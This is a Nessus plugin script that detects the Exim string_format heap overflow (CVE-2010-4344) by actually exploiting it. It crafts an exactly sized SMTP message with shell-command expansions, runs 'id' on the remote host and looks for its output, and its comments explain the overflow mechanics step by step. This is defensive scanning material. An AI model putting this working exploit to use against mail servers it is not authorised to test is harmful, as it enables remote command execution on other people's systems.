#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(51179);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2016/11/11 20:08:42 $");

  script_cve_id("CVE-2010-4344");
  script_bugtraq_id(45308);
  script_osvdb_id(69685);

  script_name(english:"Exim string_format Function Remote Overflow");
  script_summary(english:"Tries to run a command.");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote service has a buffer overflow."
  );
  script_set_attribute(
    attribute:"description",
    value:
"A heap overflow vulnerability exists in the version of exim
installed on the remote host. 

By sending a specially crafted message to the server, a remote
attacker can leverage this vulnerability to execute arbitrary code on
the server with the privilege of the exim server. A separate vulnerability
that Nessus didn't test for, CVE-2010-4345, is often used to elevate the
exim user to root access. 

Note that Nessus checked for this vulnerability by sending a specially
crafted packet and checking the response, without crashing the
service. 

All 4.6x versions 4.69-9 and below are known to be affected, and others
may be as well."
  );

  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to version 4.70 as it addresses the issue."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Exim4 string_format Function Heap Buffer Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"see_also", value:"http://bugs.exim.org/show_bug.cgi?id=787" );
  script_set_attribute(attribute:"see_also", value:"http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=606612" );
  script_set_attribute(attribute:"see_also", value:"http://www.exim.org/lurker/message/20101207.215955.bb32d4f2.en.html" );
script_set_attribute(attribute:"vuln_publication_date", value:"2010/12/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/12/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/12/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:exim:exim");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"SMTP problems");
  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencie("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");

# Get the SMTP port
port = get_service(svc:"smtp", default:25, exit_on_fail:TRUE);
if (!get_port_state(port)) exit(0, "Port "+port+" is not open.");


# Get the banner from the registry (so we can bail early if it isn't a vulnerable version)
banner = get_smtp_banner(port:port);
if (!banner) exit(1, "The mail server listening on port "+port+" didn't respond.");
if ("Exim" >!< banner) exit(1, "The mail server listening on port "+port+" does not appear to be Exim.");

# Make sure the version of exim is 4.6x - other versions aren't vulnerable
banner = eregmatch(pattern:"^220 .*(Exim [0-9]+\.[0-9]+)", string:banner);
if (!banner) exit(1, "The Exim install listening on port "+port+" returned an unexpected response to EHLO.");
if ('4.6' >!< banner[1]) exit(1, "The Exim install listening on port "+port+" doesn't look like a vulnerable version.");


# Set up some variables
from = smtp_from_header();

to = get_kb_item("SMTP/headers/To");
if (!to) to = 'root@localhost';

# The user@ portion of the from/to headers (required for length checking)
from_user = eregmatch(pattern:"^(.*)@(.*)$", string:from);
from_user = from_user[1];

to_user = eregmatch(pattern:"^(.*)@(.*)$", string:from);
to_user = to_user[1];

if (!from_user) exit(1, "'from' email address was in an invalid format: " + from);

if(!to_user) exit(1, "'to' email address was in an invalid format: " + from);

# Hostname and ip should be filled in after the EHLO
hostname = 'nessus';
ip = "xxx.xxx.x.xxx";

# Initialize the overflow size to 50mb (this should be filled in later)
max_size = 50 * 1024 * 1024;

# The command to run when we get access, and how to match it
command = 'id';
command_match = 'uid=';

# Open the socket
socket = open_sock_tcp(port);
if (!socket) exit(1, "Can't open socket on port "+port+".");

# Receive the first line
header = recv_line( socket:socket, length:1024);
if(!header) exit(1, "The Exim install listening on port "+port+" didn't respond.");

# Send the EHLO
request = 'EHLO ' + hostname + '\r\n';
send(socket:socket, data:request);

# Parse the options (we're interested in SIZE, which tells us how big we have to go to generate an error)
while(TRUE)
{
  # Get the next options line
  options = recv_line( socket:socket, length:1024);

  # Parse it to make sure it's not an error
  options = eregmatch(pattern:"^250([ -])(.*)", string:options);
  if(!options)
    exit(0, "Server on port "+port+" returned an unexpected result");

  # In the 'hello' response, parse out the hostname/ip address
  # 250-debian Hello domain.com [192.168.103.1]
  if("Hello" >< options[2])
  {
    options = eregmatch(pattern:"Hello ([^ ]+) \[([0-9.]+)\]", string:options[2]);
    if(!options)
      exit(1, "Server returned an unexected 'Hello' string");
    hostname = options[1];
    ip = options[2];
  }

  # Parse the 'size' - this tells us how much we need to overflow the buffer
  # 250-SIZE 52428800
  if("SIZE" >< options[2])
  {
    new_size = eregmatch(pattern:'SIZE ([0-9]*)', string:options[2]);
    if(new_size)
      max_size = int(new_size[1]);
  }

  # Check if we're at the end of the options array
  if(options[1] == ' ')
    break;
}

# Send the MAIL FROM and check for errors
request = 'MAIL FROM: ' + from + '\r\n';
send(socket:socket, data:request);
response = recv_line( socket:socket, length:1024);
if('250' >!< response)
  exit(1, "The Exim install listening on port "+port+" returned an unexpected result to MAIL FROM (" + response + ").");

# Send the RCPT TO (also using Metasploit's default)
request = 'RCPT TO: ' + to + '\r\n';
send(socket:socket, data:request);
response = recv_line( socket:socket, length:1024);
if('250' >!< response)
  exit(1, "The Exim install listening on port "+port+" returned an unexpected result to RCPT TO (" + response + ").");

# Send the DATA
request = 'DATA\r\n';
send(socket:socket, data:request);
response = recv_line( socket:socket, length:1024);
if('354' >!< response)
  exit(1, "The Exim install listening on port "+port+" returned an unexpected result to DATA (" + response + ").");

# Finally, we have to overflow the buffer exactly right, so there are 3 bytes left.  The
# exploit is in a sprintf()-style function called string_vformat(). If the length string
# passed to string_vformat() is exactly the same as the number of characters in the string,
# the overflow happens. That's normally difficult to accomplish, but Exim's logging for failed
# connection gives exactly that opportunity. 
#
# The buffer starts at 8192 bytes. Each line it prints shortens the buffer by that much. 
buffer_size = 8192;

# The date is prefixed to the log
buffer_size = buffer_size - strlen("2010-12-13 15:46:12 ");

# As is the message ID
buffer_size = buffer_size - strlen("1PSF66-0000nX-9z ");

# Different configurations use a different string here.. this is what the default on Slackware is:
#rejected from <root@localhost> U=root: message too big: read=56725188 max=52428800
#
# And on Debian (the one we're checking for):
#rejected from <root@localhost> H=(hostname) [192.168.103.1]: message too big: read=56725188 max=52428800
#
# Unfortunately, we can't check them all, so we're going to use Debian's default
buffer_size = buffer_size - strlen("rejected from <" + from + "> H=(" + hostname + ") [" + ip + "]: message too big: read=" + max_size + " max=" + max_size + "\n");

# string_format: 'Envelope-from: <%s>\n' => Envelope-from: <root@localhost>\n
buffer_size = buffer_size - strlen('Envelope-from: <' + from + '>\n');

# string_format: 'Envelope-to: <%s>\n' => Envelope-to: <postmaster@localhost>\n
buffer_size = buffer_size - strlen('Envelope-to: <' + to + '>\n');

# At this point, the buffer should be approximately 8000 bytes long. We need to use up all but three. 
# Build the buffer for 'data' that will use it all up
data_buffer = '';
chunk = crap(12) + ': ' + crap(100) + '\n';

# We want 3 bytes left in the buffer at the end, so substract them now (that way, we can work with 0 as a target)
buffer_size = buffer_size - 4;

# This loop is a little tricky, and was by far the hardest part (for me, at least). Basically, we have approximately
# 8000 bytes to use up. But we have to be exact to trigger the vulnerability. Each time we add a line to the array, 
# it uses up 2 extra bytes (string_vformat is called with "%c %s", and winds up with two spaces at the start - I'm 
# not sure what the '%c' means in thnis case).
#
# To make sure we don't wind up with under 3 bytes, we stop when there's between #chunk and
# #chunk * 2 bytes left and add the last two lines. That means that, at a minimum, both lines
# will be #chunk/2 bytes long. 
while(buffer_size >= strlen(chunk) * 2)
{
  to_add = '';

  data_buffer = data_buffer + chunk;
  buffer_size = buffer_size - strlen(chunk) - 2;
}

# The two pairs of extra bytes
buffer_size = buffer_size - 4;

# The new newlines
buffer_size = buffer_size - 2;

# The length of the two strings without newlines
s1 = buffer_size / 2;
s2 = buffer_size - s1;

# Finally, add them, which will create the string that exactly overflows the buffer
data_buffer = data_buffer + substr(chunk, 0, s1) + '\n'; 
data_buffer = data_buffer + substr(chunk, 0, s2) + '\n'; 

# Add the command that'll overflow the ACL
data_buffer = data_buffer + crap(7) + ": ";
for(i = 0; i < 100; i++)
  for(j = 3; j < 12; j++)
    data_buffer = data_buffer + "${run{/bin/sh -c '" + command + ">&" + j + "'}} ";
data_buffer = data_buffer + '\n';

# Send it all
send(socket:socket, data:data_buffer);

# Next, send a really really really long string. The purpose of this is the cause the mail server
# to return an error ("message too long"). We do this in a loop so we don't have to allocate 50mb
# of buffer space and annoy the memory manager. 
for(i = 0; i < 10; i++)
  send(socket:socket, data:crap(data:crap(255) + '\n', length: max_size/10));

# Terminate the email
send(socket:socket, data:'\n.\n');

# Receive the response, which should be:
# 552 Message size exceeds maximum permitted
response = recv_line( socket:socket, length:1024);
if("552 Message size exceeds maximum permitted" >!< response)
  exit(1, "The Exim install listening on port "+port+" didn't reject the oversized message.");

# Send another MAIL FROM. This will cause the boobytrapped ACL to be run, which in turn
# causes the command to be run. 
send(socket:socket, data:"MAIL FROM: " + from + '\n');

# If the overflow was successful, it'll return the command_match string multiple times. 
# If it was unsuccessful, it'll return '250 OK' (in other words, accept the email). 
while(TRUE)
{
  response = recv_line( socket:socket, length:1024);
  if (!response)
    exit(0, "The Exmin install listening on port "+port+" does not appear to be vulnerable.");
  if ("250 OK" >< response)
    exit(0, "The Exim install listening on port "+port+" is not vulnerable or has a non-standard log configuration.");
  if (command_match >< response)
  {
    if (report_verbosity > 0)
    {
      report = '\n' +
        'Nessus was able to exploit the vulnerability to execute the command\n' +
        '\'' + command + '\' on the remote host, which produced the following output :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        chomp(response) + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
